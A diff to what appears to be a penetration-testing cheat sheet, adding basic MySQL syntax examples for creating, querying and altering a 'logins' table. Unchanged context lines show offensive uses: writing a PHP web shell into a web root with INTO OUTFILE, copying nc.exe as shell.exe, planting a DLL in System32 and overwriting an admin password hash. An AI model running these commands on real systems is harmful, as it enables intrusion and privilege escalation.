@@ -321,6 +321,34 @@ fodhelper.exe
 ```bash
 # mysql login
 mysql -u 'root' -h 192.168.183.122 -p
+mysql -u 'root' -h 192.168.183.122 -pPassword
+
+# Creating a database
+CREATE DATABASE users;
+
+# Creating a table
+CREATE TABLE logins (
+    id INT NOT NULL AUTO_INCREMENT,
+    username VARCHAR(100) UNIQUE NOT NULL,
+    password VARCHAR(100) NOT NULL,
+    date_of_joining DATETIME DEFAULT NOW(),
+    PRIMARY KEY (id)
+    );
+
+# Set id filed to auto increment
+id INT NOT NULL AUTO_INCREMENT,
+
+# Set username to be unique
+username VARCHAR(100) UNIQUE NOT NULL,
+
+# default the date
+date_of_joining DATETIME DEFAULT NOW(),
+
+# primary key
+PRIMARY KEY (id)
+
+# list the table structure with its fields and data types.
+DESCRIBE logins;
 
 # general usage
 show databases;
@@ -329,9 +357,14 @@ show tables;
 select * from users_secure;
 
 # Add a new row
+INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
+INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
+INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
 INSERT INTO `users` (`id`, `user`, `password`, `date`) VALUES (NULL, 'nick', 'password', '123456789');
 
 # Update/Edit
+UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
+UPDATE logins SET password = 'change_password' WHERE id > 1;
 update users_secure SET password="$2y$10$R0cpsKNLDqDZpfxDCaq8Qufxl0uLbmwiL0k6XDR1kPBDXVIYbeQ0W" WHERE username="admin"
 
 # Upload a php file
@@ -340,6 +373,30 @@ select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile "/srv/http/cmd.php
 # Move Files
 select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
 select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
+
+#remove tables and databases
+DROP TABLE logins;
+
+# ALTER Statement(change the name of any table and any of its fields or to delete or add a new column to an existing table)
+ALTER TABLE logins ADD newColumn INT;
+ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
+ALTER TABLE logins MODIFY oldColumn DATE;
+ALTER TABLE logins DROP oldColumn;
+
+# Sorting Results
+SELECT * FROM logins ORDER BY password;
+SELECT * FROM logins ORDER BY password DESC;
+SELECT * FROM logins ORDER BY password DESC, id ASC;
+
+# Limit results
+SELECT * FROM logins LIMIT 2;
+SELECT * FROM logins LIMIT 1, 2;
+
+# LIKE Clause
+SELECT * FROM logins WHERE username LIKE 'admin%';
+# this will match with three characters
+SELECT * FROM logins WHERE username like '___';
+
 ```
 
 ## sqlite
